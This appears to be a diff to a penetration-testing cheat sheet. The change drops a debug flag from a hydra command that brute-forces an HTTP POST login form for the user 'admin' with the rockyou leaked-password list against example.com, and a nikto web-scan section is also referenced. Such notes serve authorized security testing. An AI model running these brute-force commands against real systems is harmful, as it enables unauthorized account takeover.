@@ -20,7 +20,7 @@ sudo hydra -v -V -d -l admin -P /usr/share/wordlists/seclists/Passwords/Leaked-D
 ```
 ### Syntax 2
 ```bash
-sudo hydra -v -V -d -l admin -P /usr/share/wordlists/seclists/Passwords/Leaked-Databases/rockyou.txt -o hydra_output.txt example.com http-post-form "/login:username=^USER^&password=^PASS^=:F=Bad"
+sudo hydra -v -V -l admin -P /usr/share/wordlists/seclists/Passwords/Leaked-Databases/rockyou.txt -o hydra_output.txt example.com http-post-form "/login:username=^USER^&password=^PASS^=:F=Bad"
 ```
 
 ## Web app scan with `nikto`:
